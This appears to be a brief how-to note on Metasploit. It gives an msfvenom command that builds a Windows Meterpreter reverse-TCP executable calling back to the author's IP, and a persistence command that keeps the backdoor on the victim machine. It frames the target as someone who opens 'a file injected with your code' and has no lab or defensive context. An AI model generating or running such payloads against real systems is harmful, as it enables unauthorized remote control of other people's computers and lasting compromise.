[Metasploit](https://www.metasploit.com/) is a penetration testing application that can be used to perform various activities on remote computers once they open a file injected with your code.

Here is how you create a payload

`msfvenom --payload windows/meterpreter/reverse_tcp --arch x86 --format exe LHOST=you_ip_here LPORT=4444 > somefilename.exe`

Run the following command to make it stick

`run persistence -U -i 10 -p 4444 -r your_ip_here`